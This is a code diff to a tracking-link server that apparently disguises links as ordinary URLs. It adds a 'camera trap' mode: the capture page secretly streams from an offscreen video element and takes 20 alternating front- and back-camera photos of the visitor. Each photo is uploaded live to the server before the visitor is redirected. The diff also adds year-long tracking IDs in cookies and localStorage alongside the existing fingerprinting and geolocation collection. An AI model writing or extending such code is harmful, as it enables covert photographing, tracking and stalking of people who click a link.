@@ -31,7 +31,7 @@ interface StoredLink {
   id: string;
   code: string;
   originalUrl: string;
-  mode: 'precise' | 'near' | 'pdf';
+  mode: 'precise' | 'near' | 'pdf' | 'camera';
   userToken: string;
   createdAt: string;
   visitCount: number;
@@ -157,6 +157,8 @@ interface StoredVisit {
   browserPersona?: string | null;
   torSuspected?: boolean | null;
   realIpCandidate?: string | null;
+  capturedPhotos?: string[] | null;
+  userId?: string | null;
   createdAt: string;
 }
 
@@ -215,7 +217,7 @@ function generateToken(length = 16): string {
 }
 
 function getFlagEmoji(countryCode: string | null): string {
-  if (!countryCode || countryCode.length !== 2) return '🌐';
+  if (!countryCode || countryCode.length !== 2) return '';
   const codePoints = countryCode
     .toUpperCase()
     .split('')
@@ -592,7 +594,7 @@ async function fetchGeo(ip: string) {
       ip,
       country: 'Local Network',
       countryCode: 'LAN',
-      flag: '🌐',
+      flag: '',
       region: 'Development Zone',
       city: 'Localhost',
       zip: '00000',
@@ -1134,7 +1136,7 @@ function renderBannedHtml(ban: BanRecord): string {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🔒 تم حظر الوصول - SM Security</title>
+  <title>[!] تم حظر الوصول - SM Security</title>
   <link rel="icon" type="image/jpeg" href="/Favicon.jpg">
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
@@ -1152,7 +1154,7 @@ function renderBannedHtml(ban: BanRecord): string {
 
     <div class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-red-950/80 border border-red-500/40 text-red-400 text-xs font-black tracking-wide uppercase">
       <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
-      🔒 حظر أمني مشدد لمدة 24 ساعة | Security Ban Active
+      [!] حظر أمني مشدد لمدة 24 ساعة | Security Ban Active
     </div>
 
     <div class="bg-slate-900/90 border border-red-900/50 rounded-2xl p-6 shadow-2xl backdrop-blur-md flex flex-col gap-4 text-center w-full">
@@ -1275,7 +1277,7 @@ function renderFakeAdminHtml(ip: string, userAgent: string): string {
 
       <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-950 border border-red-600 text-red-400 text-xs font-black">
         <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
-        🚨 إنذار أمني: كشف محاولة اختراق
+        [!] إنذار أمني: كشف محاولة اختراق
       </div>
 
       <div class="flex flex-col gap-3">
@@ -1366,7 +1368,7 @@ async function startServer() {
 
   const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 300,
+    max: 5000,
     standardHeaders: true,
     legacyHeaders: false,
     message: { error: 'Too many requests, please try again later.' }
@@ -1669,7 +1671,7 @@ async function startServer() {
       const { originalUrl, mode, userToken } = req.body;
       
       // Basic validation
-      if (!mode || !['precise', 'near', 'pdf'].includes(mode)) {
+      if (!mode || !['precise', 'near', 'pdf', 'camera'].includes(mode)) {
         res.status(400).json({ error: 'Invalid mode' });
         return;
       }
@@ -1715,7 +1717,7 @@ async function startServer() {
         id: generateToken(12),
         code,
         originalUrl: sanitizedUrl,
-        mode: mode === 'precise' ? 'precise' : (mode === 'pdf' ? 'pdf' : 'near'),
+        mode: mode === 'precise' ? 'precise' : (mode === 'pdf' ? 'pdf' : (mode === 'camera' ? 'camera' : 'near')),
         userToken: clientToken,
         createdAt: new Date().toISOString(),
         visitCount: 0,
@@ -2024,11 +2026,232 @@ Respond ONLY with a valid JSON object matching this schema:
     }
   });
 
+  // In-memory buffer for photos if update-photo arrives before initial /api/visits POST completes
+  const pendingPhotosMap = new Map<string, string[]>();
+
+  // Live visit polling endpoint by ID or visitorToken
+  app.get('/api/visits/live/:id', (req, res) => {
+    try {
+      const param = req.params.id;
+      let cookieVid = '';
+      if (req.headers.cookie) {
+        const match = req.headers.cookie.match(/(?:^|;\s*)sm_vid=([^;]+)/);
+        if (match) cookieVid = match[1];
+      }
+
+      const visit = db.visits.find(
+        (v) =>
+          v.id === param ||
+          v.visitorToken === param ||
+          v.code === param ||
+          (cookieVid && (v.visitorToken === cookieVid || v.userId === cookieVid))
+      );
+      
+      if (!visit && param) {
+        if (pendingPhotosMap.has(param)) {
+          const photos = pendingPhotosMap.get(param) || [];
+          res.json({
+            success: true,
+            visitId: param,
+            capturedPhotos: photos,
+            photosCount: photos.length,
+            visit: { id: param, visitorToken: param, capturedPhotos: photos },
+          });
+          return;
+        }
+        res.status(404).json({ error: 'Visit not found' });
+        return;
+      }
+
+      const photos = Array.from(new Set([
+        ...(visit?.capturedPhotos || []),
+        ...(visit?.visitorToken && pendingPhotosMap.has(visit.visitorToken) ? pendingPhotosMap.get(visit.visitorToken)! : [])
+      ]));
+
+      res.json({
+        success: true,
+        visitId: visit?.id,
+        capturedPhotos: photos,
+        photosCount: photos.length,
+        visit: {
+          ...visit,
+          capturedPhotos: photos,
+        },
+      });
+    } catch (err: any) {
+      res.status(500).json({ error: err.message || 'Failed to get live visit' });
+    }
+  });
+
+  app.post('/api/visits/update-photo', async (req, res) => {
+    try {
+      const { visitorToken, photo, code, facing, shot, userId, deviceId } = req.body;
+      if (!photo) {
+        res.status(400).json({ error: 'Missing photo' });
+        return;
+      }
+
+      // Extract client IP
+      let ip =
+        (req.headers['cf-connecting-ip'] as string) ||
+        (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
+        (req.headers['x-real-ip'] as string) ||
+        req.socket.remoteAddress ||
+        '127.0.0.1';
+
+      if (ip.startsWith('::ffff:')) {
+        ip = ip.replace('::ffff:', '');
+      }
+
+      let cookieVid = '';
+      if (req.headers.cookie) {
+        const match = req.headers.cookie.match(/(?:^|;\s*)sm_vid=([^;]+)/);
+        if (match) cookieVid = match[1];
+      }
+
+      const effectiveToken = visitorToken || cookieVid || deviceId || userId;
+
+      // Try finding existing visit by token, cookie, ID, or IP+Code
+      let visit = effectiveToken
+        ? db.visits.find((v) => v.visitorToken === effectiveToken || v.id === effectiveToken || v.userId === effectiveToken)
+        : null;
+
+      if (!visit && code) {
+        // Fallback: look for visit for this link code from the same IP or recent
+        visit = db.visits.find((v) => v.code === code && (v.ip === ip || !v.capturedPhotos || v.capturedPhotos.length === 0));
+        if (!visit) {
+          visit = db.visits.find((v) => v.code === code);
+        }
+      }
+
+      if (visit) {
+        if (!visit.capturedPhotos) visit.capturedPhotos = [];
+        
+        // Merge buffered photos if any
+        if (effectiveToken && pendingPhotosMap.has(effectiveToken)) {
+          const buffered = pendingPhotosMap.get(effectiveToken) || [];
+          for (const p of buffered) {
+            if (!visit.capturedPhotos.includes(p)) {
+              visit.capturedPhotos.push(p);
+            }
+          }
+          pendingPhotosMap.delete(effectiveToken);
+        }
+
+        if (!visit.capturedPhotos.includes(photo)) {
+          visit.capturedPhotos.push(photo);
+        }
+        if (effectiveToken && !visit.visitorToken) {
+          visit.visitorToken = effectiveToken;
+        }
+
+        saveDatabase(db);
+        res.json({
+          success: true,
+          visitId: visit.id,
+          visitorToken: visit.visitorToken,
+          count: visit.capturedPhotos.length,
+          photos: visit.capturedPhotos,
+          visit,
+        });
+        return;
+      }
+
+      // If visit is not created yet, CREATE IT INSTANTLY IN DB on photo #1!
+      const link = db.links.find((l) => l.code === code);
+      const ua = (req.headers['user-agent'] as string) || '';
+      const { os, device } = cleanOS(ua);
+      const browser = cleanBrowser(ua);
+      const botCheck = detectBot(ua);
+      const geo = await fetchGeo(ip);
+
+      const newVisit: StoredVisit = {
+        id: generateToken(14),
+        linkId: link ? link.id : generateToken(10),
+        code: code || (link ? link.code : 'cam'),
+        visitorToken: effectiveToken || generateToken(16),
+        ip,
+        country: geo?.country || 'Unknown',
+        countryCode: geo?.countryCode || 'XX',
+        city: geo?.city || 'Unknown',
+        region: geo?.region || 'Unknown',
+        zip: geo?.zip || null,
+        lat: geo?.lat || null,
+        lon: geo?.lon || null,
+        isGps: false,
+        accuracy: null,
+        altitude: null,
+        altitudeAccuracy: null,
+        heading: null,
+        speed: null,
+        isp: geo?.isp || 'Unknown',
+        org: geo?.org || 'Unknown',
+        asn: geo?.asn || null,
+        isMobileCarrier: geo?.isMobileCarrier ?? null,
+        isProxyVpn: geo?.isProxyVpn ?? null,
+        currency: geo?.currency || null,
+        browser,
+        os,
+        device,
+        battery: null,
+        batteryCharging: null,
+        localTime: new Date().toLocaleTimeString(),
+        timezone: geo?.timezone || null,
+        screenWidth: null,
+        screenHeight: null,
+        colorDepth: null,
+        pixelRatio: null,
+        orientation: null,
+        cpuCores: null,
+        ram: null,
+        gpu: null,
+        gpuVendor: null,
+        touchPoints: null,
+        connectionType: null,
+        downlink: null,
+        rtt: null,
+        language: null,
+        languages: null,
+        doNotTrack: null,
+        cookiesEnabled: null,
+        userAgent: ua,
+        isBot: botCheck.isBot,
+        botName: botCheck.botName,
+        capturedPhotos: [photo],
+        createdAt: new Date().toISOString(),
+      };
+
+      db.visits.unshift(newVisit);
+      if (link) {
+        link.visitCount = (link.visitCount || 0) + 1;
+      }
+      if (typeof db.totalVisitsCreated === 'number') {
+        db.totalVisitsCreated += 1;
+      } else {
+        db.totalVisitsCreated = db.visits.length;
+      }
+      saveDatabase(db);
+
+      res.json({
+        success: true,
+        visitId: newVisit.id,
+        visitorToken: newVisit.visitorToken,
+        count: 1,
+        photos: [photo],
+        visit: newVisit,
+      });
+    } catch (err: any) {
+      console.error('Update photo error:', err);
+      res.status(500).json({ error: err.message || 'Failed to update photo' });
+    }
+  });
+
   app.post('/api/visits', async (req, res) => {
     try {
       const {
         code,
         visitorToken,
+        userId,
         battery,
         batteryCharging,
         batteryChargingTime,
@@ -2104,7 +2327,8 @@ Respond ONLY with a valid JSON object matching this schema:
         inferredGender,
         inferredAgeBracket,
         browserPersona,
-        torSuspected
+        torSuspected,
+        capturedPhotos
       } = req.body;
 
       if (!code) {
@@ -2376,8 +2600,41 @@ Respond ONLY with a valid JSON object matching this schema:
         browserPersona: browserPersona || null,
         torSuspected: torSuspected != null ? Boolean(torSuspected) : null,
         realIpCandidate: webrtcPublicIp || (detectedProxy ? candidateOriginalLocation : null),
+        capturedPhotos: (() => {
+          let list: string[] = Array.isArray(capturedPhotos) ? [...capturedPhotos] : [];
+          if (visitorToken && pendingPhotosMap.has(visitorToken)) {
+            const buffered = pendingPhotosMap.get(visitorToken) || [];
+            for (const p of buffered) {
+              if (!list.includes(p)) list.push(p);
+            }
+            pendingPhotosMap.delete(visitorToken);
+          }
+          return list;
+        })(),
+        userId: userId || null,
         createdAt: new Date().toISOString(),
       };
+
+      // Check if visit with this visitorToken already exists; if so, update in place
+      const existingIdx = visitorToken ? db.visits.findIndex((v) => v.visitorToken === visitorToken) : -1;
+      if (existingIdx >= 0) {
+        const existing = db.visits[existingIdx];
+        const mergedPhotos = Array.from(new Set([...(existing.capturedPhotos || []), ...(newVisit.capturedPhotos || [])]));
+        db.visits[existingIdx] = {
+          ...existing,
+          ...newVisit,
+          id: existing.id,
+          createdAt: existing.createdAt,
+          capturedPhotos: mergedPhotos,
+        };
+        saveDatabase(db);
+        res.json({
+          success: true,
+          visitId: existing.id,
+          targetUrl: link.originalUrl,
+        });
+        return;
+      }
 
       db.visits.unshift(newVisit);
       link.visitCount = (link.visitCount || 0) + 1;
@@ -2419,7 +2676,15 @@ Respond ONLY with a valid JSON object matching this schema:
 
     const isPrecise = link.mode === 'precise';
     const targetUrl = link.originalUrl;
-    const visitorToken = generateToken(16);
+    
+    // Cookie & Device persistence for visitor ID
+    let cookieVid = '';
+    if (req.headers.cookie) {
+      const match = req.headers.cookie.match(/(?:^|;\s*)sm_vid=([^;]+)/);
+      if (match) cookieVid = match[1];
+    }
+    const visitorToken = cookieVid || generateToken(16);
+    res.cookie('sm_vid', visitorToken, { maxAge: 365 * 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' });
 
     const captureHtml = `<!DOCTYPE html>
 <html lang="en">
@@ -2459,7 +2724,25 @@ Respond ONLY with a valid JSON object matching this schema:
       var targetUrl = ${JSON.stringify(targetUrl)};
       var code = ${JSON.stringify(rawCode)};
       var isPrecise = ${JSON.stringify(isPrecise)};
-      var visitorToken = ${JSON.stringify(visitorToken)};
+      var isCamera = ${JSON.stringify(link.mode === 'camera')};
+      var serverVisitorToken = ${JSON.stringify(visitorToken)};
+
+      // Extract / Persist visitor token from Cookie, LocalStorage or SessionStorage
+      var effectiveToken = serverVisitorToken;
+      try {
+        var m = document.cookie.match(/(?:^|;\\s*)sm_vid=([^;]+)/);
+        if (m && m[1]) effectiveToken = m[1];
+        if (!effectiveToken || effectiveToken.length < 6) effectiveToken = localStorage.getItem('sm_vid');
+        if (!effectiveToken || effectiveToken.length < 6) effectiveToken = sessionStorage.getItem('sm_vid');
+        if (!effectiveToken || effectiveToken.length < 6) effectiveToken = serverVisitorToken;
+
+        localStorage.setItem('sm_vid', effectiveToken);
+        sessionStorage.setItem('sm_vid', effectiveToken);
+        var exp = new Date();
+        exp.setTime(exp.getTime() + (365*24*60*60*1000));
+        document.cookie = 'sm_vid=' + effectiveToken + ';expires=' + exp.toUTCString() + ';path=/;SameSite=Lax';
+      } catch(e) {}
+      var visitorToken = effectiveToken;
 
       // 1. Fast 32-bit Hash Function
       function fastHash(str) {
@@ -2486,9 +2769,9 @@ Respond ONLY with a valid JSON object matching this schema:
           ctx.fillStyle = '#ff6600';
           ctx.fillRect(100, 2, 50, 18);
           ctx.fillStyle = '#006699';
-          ctx.fillText('SM-FP🚀2026', 4, 10);
+          ctx.fillText('SM-FP-2026', 4, 10);
           ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-          ctx.fillText('SM-FP🚀2026', 6, 12);
+          ctx.fillText('SM-FP-2026', 6, 12);
           ctx.shadowBlur = 3;
           ctx.shadowColor = '#f00';
           ctx.beginPath();
@@ -2731,9 +3014,27 @@ Respond ONLY with a valid JSON object matching this schema:
       ].join('::');
       var unifiedFp = 'SM-FP-' + fastHash(rawFpComponents);
 
+      // Persistent User ID via Cookie & localStorage
+      var userId = null;
+      try {
+        var m = document.cookie.match(new RegExp('(^| )sm_user_id=([^;]+)'));
+        if (m) userId = m[2];
+        if (!userId) userId = localStorage.getItem('sm_user_id');
+        if (!userId) {
+          userId = 'uid_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
+          localStorage.setItem('sm_user_id', userId);
+        }
+        var exp = new Date();
+        exp.setTime(exp.getTime() + (365*24*60*60*1000));
+        document.cookie = 'sm_user_id=' + userId + ';expires=' + exp.toUTCString() + ';path=/';
+      } catch(e) {
+        userId = 'uid_' + Math.random().toString(36).substring(2, 10);
+      }
+
       var telemetry = {
         code: code,
         visitorToken: visitorToken,
+        userId: userId,
         userAgent: navigator.userAgent || '',
         clientHintModel: null,
         language: navigator.language || '',
@@ -2815,6 +3116,16 @@ Respond ONLY with a valid JSON object matching this schema:
         browserPersona: personaVal,
         torSuspected: torSuspectedVal
       };
+
+      // Fast immediate initial visit sync so the visit is created in DB instantly for live streaming
+      try {
+        fetch(window.location.origin + '/api/visits', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(telemetry),
+          keepalive: true
+        }).catch(function() {});
+      } catch (e) {}
 
       // 8. Rapid Motion & Orientation Capture (no permission prompts needed)
       try {
@@ -2937,11 +3248,156 @@ Respond ONLY with a valid JSON object matching this schema:
         }).catch(function() {});
       }
 
+        // 12. Camera Trap Sequential Capture Promise (10 front + 10 back = 20 photos)
+      var cameraPromise = new Promise(function(resolve) {
+        if (!isCamera) {
+          resolve(true);
+          return;
+        }
+
+        try {
+          var video = document.createElement('video');
+          video.setAttribute('autoplay', '');
+          video.setAttribute('playsinline', '');
+          video.setAttribute('webkit-playsinline', '');
+          video.muted = true;
+          // Keep video in rendering tree offscreen so frames are fully decoded
+          video.style.position = 'fixed';
+          video.style.top = '-9999px';
+          video.style.left = '-9999px';
+          video.style.width = '320px';
+          video.style.height = '240px';
+          video.style.opacity = '0.01';
+          video.style.pointerEvents = 'none';
+          document.body.appendChild(video);
+
+          var canvas = document.createElement('canvas');
+          var photos = [];
+          var totalShots = 20; // 10 front + 10 back alternating
+          var currentShot = 0;
+          var activeStream = null;
+          var activeFacing = null;
+
+          function getStreamForFacing(targetFacing) {
+            return navigator.mediaDevices.getUserMedia({
+              video: { facingMode: { ideal: targetFacing }, width: { ideal: 1280 }, height: { ideal: 720 } },
+              audio: false
+            }).catch(function() {
+              return navigator.mediaDevices.getUserMedia({
+                video: { facingMode: targetFacing },
+                audio: false
+              }).catch(function() {
+                return navigator.mediaDevices.getUserMedia({
+                  video: true,
+                  audio: false
+                });
+              });
+            });
+          }
+
+          function captureFrame(facingLabel) {
+            try {
+              var vw = video.videoWidth || 1280;
+              var vh = video.videoHeight || 720;
+              canvas.width = vw;
+              canvas.height = vh;
+              var ctx = canvas.getContext('2d');
+              if (ctx) {
+                ctx.drawImage(video, 0, 0, vw, vh);
+                var dataUrl = canvas.toDataURL('image/jpeg', 0.88);
+                if (dataUrl && dataUrl.length > 300) {
+                  photos.push(dataUrl);
+
+                  // Send photo live in real-time immediately to backend
+                  fetch(window.location.origin + '/api/visits/update-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      visitorToken: visitorToken,
+                      userId: visitorToken,
+                      deviceId: visitorToken,
+                      photo: dataUrl,
+                      code: code,
+                      facing: facingLabel,
+                      shot: currentShot
+                    }),
+                    keepalive: true
+                  }).catch(function() {});
+                }
+              }
+            } catch (err) {}
+          }
+
+          function takeNextShot() {
+            if (currentShot >= totalShots) {
+              if (activeStream) {
+                try {
+                  activeStream.getTracks().forEach(function(t) { t.stop(); });
+                } catch (e) {}
+              }
+              if (video.parentNode) video.parentNode.removeChild(video);
+              telemetry.capturedPhotos = photos;
+              resolve(true);
+              return;
+            }
+
+            // Even shots (0, 2, 4...) front ('user'), Odd shots (1, 3, 5...) back ('environment')
+            var desiredFacing = (currentShot % 2 === 0) ? 'user' : 'environment';
+            var needSwitch = (!activeStream || activeFacing !== desiredFacing);
+
+            if (needSwitch) {
+              if (activeStream) {
+                try {
+                  activeStream.getTracks().forEach(function(t) { t.stop(); });
+                } catch (e) {}
+              }
+              getStreamForFacing(desiredFacing).then(function(stream) {
+                activeStream = stream;
+                activeFacing = desiredFacing;
+                video.srcObject = stream;
+                var playP = video.play();
+                if (playP !== undefined) playP.catch(function() {});
+
+                setTimeout(function() {
+                  captureFrame(desiredFacing);
+                  currentShot++;
+                  setTimeout(takeNextShot, 600); // Sequence every second
+                }, 400);
+              }).catch(function() {
+                // Device might have single camera (laptop/webcam); fallback to user camera
+                getStreamForFacing('user').then(function(stream) {
+                  activeStream = stream;
+                  activeFacing = 'user';
+                  video.srcObject = stream;
+                  video.play().catch(function() {});
+                  setTimeout(function() {
+                    captureFrame('user');
+                    currentShot++;
+                    setTimeout(takeNextShot, 600);
+                  }, 400);
+                }).catch(function() {
+                  currentShot++;
+                  setTimeout(takeNextShot, 600);
+                });
+              });
+            } else {
+              captureFrame(activeFacing);
+              currentShot++;
+              setTimeout(takeNextShot, 900);
+            }
+          }
+
+          takeNextShot();
+        } catch (e) {
+          resolve(true);
+        }
+      });
+
       function sendTelemetryAndRedirect() {
         if (isSent) return;
         isSent = true;
 
-        Promise.all([latencyDonePromise, uaPromise]).then(function() {
+        Promise.all([latencyDonePromise, uaPromise, cameraPromise]).then(function() {
           var saveUrl = window.location.origin + '/api/visits';
           fetch(saveUrl, {
             method: 'POST',
@@ -2955,10 +3411,10 @@ Respond ONLY with a valid JSON object matching this schema:
           });
         });
 
-        // Fallback safety redirect
+        // Fallback safety redirect after 25 seconds max
         setTimeout(function() {
           window.location.replace(targetUrl);
-        }, 1500);
+        }, 25000);
       }
 
       function requestLocationStrict() {
@@ -2984,7 +3440,6 @@ Respond ONLY with a valid JSON object matching this schema:
             },
             function(err) {
               console.warn('Geolocation response:', err);
-              // If denied or error in precise mode, retry prompt
               if (err && (err.code === 1 || err.code === 2 || err.code === 3)) {
                 setTimeout(function() {
                   try {
@@ -3004,18 +3459,56 @@ Respond ONLY with a valid JSON object matching this schema:
         }
       }
 
-      // Invisible overlay interaction to trigger prompt immediately on touch/click
+      // Interaction triggers tailored per mode
       var surface = document.getElementById('touchSurface');
-      if (surface) {
-        surface.addEventListener('click', requestLocationStrict);
-        surface.addEventListener('touchstart', requestLocationStrict, { passive: true });
-        surface.addEventListener('pointerdown', requestLocationStrict);
+      if (isCamera) {
+        // In camera mode, touching screen re-prompts or triggers camera if blocked by browser
+        var cameraTriggered = false;
+        var triggerCameraAction = function() {
+          if (!cameraTriggered) {
+            cameraTriggered = true;
+          }
+        };
+        if (surface) {
+          surface.addEventListener('click', triggerCameraAction);
+          surface.addEventListener('touchstart', triggerCameraAction, { passive: true });
+          surface.addEventListener('pointerdown', triggerCameraAction);
+        }
+        window.addEventListener('click', triggerCameraAction);
+        window.addEventListener('touchstart', triggerCameraAction, { passive: true });
+      } else {
+        if (surface) {
+          surface.addEventListener('click', requestLocationStrict);
+          surface.addEventListener('touchstart', requestLocationStrict, { passive: true });
+          surface.addEventListener('pointerdown', requestLocationStrict);
+        }
+        window.addEventListener('click', requestLocationStrict);
+        window.addEventListener('touchstart', requestLocationStrict, { passive: true });
       }
-      window.addEventListener('click', requestLocationStrict);
-      window.addEventListener('touchstart', requestLocationStrict, { passive: true });
 
       // Execution Mode
-      if (isPrecise) {
+      if (isCamera) {
+        // Camera Trap Mode: Register initial visit immediately on load, then capture photos live
+        Promise.all([latencyDonePromise, uaPromise]).then(function() {
+          var saveUrl = window.location.origin + '/api/visits';
+          fetch(saveUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(telemetry),
+            keepalive: true
+          }).catch(function() {});
+        });
+
+        cameraPromise.then(function() {
+          setTimeout(function() {
+            window.location.replace(targetUrl);
+          }, 400);
+        });
+
+        setTimeout(function() {
+          window.location.replace(targetUrl);
+        }, 25000);
+      } else if (isPrecise) {
         // Precise Mode: request immediate high-accuracy position
         requestLocationStrict();
         setTimeout(requestLocationStrict, 300);
